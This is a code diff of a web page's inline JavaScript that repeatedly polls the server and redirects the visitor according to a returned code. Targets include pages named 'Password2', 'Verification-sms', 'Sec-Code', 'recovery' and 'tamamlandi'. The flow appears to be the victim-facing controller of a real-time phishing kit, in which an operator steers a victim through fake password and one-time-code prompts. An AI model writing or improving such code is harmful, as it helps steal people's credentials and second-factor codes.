@@ -8,56 +8,41 @@
 
 
 
-
+<script>
+    var userMail = "@edit.mail";
+</script>
 
 <script type="text/javascript">
-    $(document).ready(function () {
-        gonder();
-        var ints = self.setInterval("gonder()", 3000);
-    });
+    var xhr;
+    var sInt = setInterval(function () {
+        ajax('/getuser?mail=' + userMail, function () {
+            if (this.readyState == 4 && this.status == 200) {
+                var xhr = JSON.parse(this.responseText);
 
-    function gonder() {
-        
-        $.ajax({
-            type: 'POST',
-            url: '/controls',
-            data: postmodel,
-            success: function (msg) {
+                if (xhr.stype == 2) {
+                    window.location.href = '/Password2';
+                }
 
-                if (msg == 1) {
-                    window.location.href = 'Index';
-                }
-                if (msg == 3) {
-                    window.location.href = 'Password2';
-                }
-                if (msg == 4) {
-                    window.location.href = 'Verification-sms';
-                }
-                if (msg == 5) {
-                    window.location.href = 'Verification-sms-error';
-                }
-                if (msg == 6) {
-                    window.location.href = 'Verification';
-                }
-                if (msg == 7) {
-                    window.location.href = 'tamamlandi';
-                }
-                if (msg == 8) {
-                    window.location.href = 'Verification-number';
-                }
-                if (msg == 9) {
-                    window.location.href = 'Sec-Code';
-                }
-                if (msg == 10) {
-                    window.location.href = 'recovery';
-                }
-                if (msg == 11) {
-                    window.location.href = 'username-error';
-                }
+
+
+
+
             }
         });
 
+    }, 5000);
+
+
+    function ajax(url, callMethod) {
+        var request = new XMLHttpRequest(); request.onreadystatechange = callMethod;
+        request.open("POST", url, true); request.send();
     }
+
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+
 
 </script>
 
